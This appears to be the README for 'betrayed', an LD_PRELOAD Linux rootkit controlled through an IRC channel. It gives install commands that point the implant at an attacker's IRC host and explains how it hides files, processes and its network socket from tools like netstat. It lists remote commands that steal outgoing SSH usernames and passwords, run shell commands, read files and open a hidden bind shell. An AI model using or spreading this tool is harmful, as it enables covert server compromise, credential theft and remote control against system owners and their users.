# betrayed
### Basic info
betrayed is an LD_PRELOAD Linux rootkit which is controlled mainly from a IRC channel.</br>
It is free of any dependencies, and installs near enough instantly.</br>
Files and processes are hidden with a magic GID, and the connection to the IRC server is hidden from plain sight. Tools like `netstat` and `ss` will not show betrayed's socket connection.</br>
Upon setup, betrayed will begin to fork from newly spawned processes, of course only if there is no other instance of the main process.</br>
betrayed's code is a very heavily modified and (de)restructured version of bedevil.
#### Usage
There are two scripts you can use to install betrayed. One is a regular compile/install script, the other script is intended to directly install betrayed without asking you for input during installation.</br>
<b>install.sh</b> will ask you for a host which betrayed will connect to, and a channel upon which to join.</br>
<b>auto.sh:</b> `./auto.sh irc.host "#channel"` will directly install betrayed without asking you for input at runtime.</br>
Once you have ran either of these two scripts, install.sh will `cat /dev/null`, which will cause betrayed to execute its initial fork process. Even without doing `cat /dev/null` at the end of the installation, any newly spawned process will initiate the connection to the IRC server.</br>
<b>Compile only:</b> `COMPILE_ONLY=1 ./install.sh` will compile betrayed.so in your cwd.</br>
</br>
Once installed, and assuming you are in your target channel, you will see a new user with a random nick join your channel. That is essentially the box that you installed betrayed on.
#### Available commands
 * !ssh_logs (reads outgoing SSH logs, sends usernames and passwords to your desired IRC channel)
 * !sh [command] (executes commands on the server that betrayed is installed on, and sends command output to the channel)
 * !read_file [path] (sends contents of path to IRC channel)
 * !bind [port] (creates a hidden /bin/sh bind shell on given port which you can connect to)
 * !kill [nick] (kills specified iteration of betrayed. removes ld.so.preload and disconnects)

